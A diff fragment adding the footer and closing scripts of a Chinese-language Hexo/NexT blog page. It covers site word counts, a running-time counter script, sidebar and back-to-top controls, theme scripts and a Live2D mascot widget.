+    <span title="站点总字数">38k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">34 分钟</span>
+  </span>
+</div>
+
+<!--
+隐藏网页底部 powered By Hexo / 强力驱动
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">全站共 9.6k 字</span>
+</div>
+
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("05/15/2024 10:00:00"); //此处修改你的建站时间或者网站上线时间,格式为：月/日/年 时:分:秒
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒.";
+    }
+setInterval("createtime()",250);
+
+</script>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  <script async src="/js/cursor/text.js"></script>
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true}});</script></body>
+</html>
